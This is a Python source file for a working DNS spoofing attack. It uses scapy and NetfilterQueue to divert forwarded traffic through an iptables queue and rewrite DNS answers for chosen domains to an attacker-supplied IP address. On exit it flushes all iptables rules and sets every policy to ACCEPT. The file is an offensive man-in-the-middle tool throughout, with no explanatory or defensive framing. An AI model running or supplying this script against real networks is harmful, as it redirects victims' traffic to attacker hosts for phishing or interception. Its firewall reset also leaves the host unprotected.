from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

ipv4 = sys.argv[1]

hostdict = {}
spoofdict= {}
attackdict = {}
domains = open('../domains.txt','r')
urls = domains.readlines()
for url in urls:
    tobytes = bytes(url.strip(), encoding="utf-8")
    hostdict[tobytes] = ipv4

spoofbytes = bytes(sys.argv[2].strip(), encoding="utf-8")
spoofdict[spoofbytes] = ipv4

attackbytes = bytes(sys.argv[3].strip(), encoding="utf-8")
attackdict[attackbytes] = ipv4

def spoof_pkt(packet):
    
    if sys.argv[2] == "None" and sys.argv[3] == "All":
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            try:
                qname = scapy_packet[DNSQR].qname
                if qname not in hostdict:
                    pass
                else:
                    print("[Before]:", scapy_packet.summary())
                    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=hostdict[qname])
                    scapy_packet[DNS].ancount = 1
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
                    print("[After ]:", scapy_packet.summary())
            except IndexError:
                pass
            packet.set_payload(bytes(scapy_packet))
    elif sys.argv[2] != "None":
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            print("[Before]:", scapy_packet.summary())
            try:
                qname = scapy_packet[DNSQR].qname
                if qname not in spoofdict:
                    pass
                else:
                    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=spoofdict[qname])
                    scapy_packet[DNS].ancount = 1
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
            except IndexError:
                pass
            print("[After ]:", scapy_packet.summary())
            packet.set_payload(bytes(scapy_packet))
    else:
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            print("[Before]:", scapy_packet.summary())
            try:
                qname = scapy_packet[DNSQR].qname
                if qname not in attackdict:
                    pass
                else:
                    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=attackdict[qname])
                    scapy_packet[DNS].ancount = 1
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
            except IndexError:
                pass
            print("[After ]:", scapy_packet.summary())
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


QUEUE_NUM = 0
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
queue = NetfilterQueue()
try:
    queue.bind(QUEUE_NUM, spoof_pkt)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables -P INPUT ACCEPT")
    os.system("iptables -P FORWARD ACCEPT")
    os.system("iptables -P OUTPUT ACCEPT")
    os.system("iptables -F")

    print("\nEnding DNS Spoof\n")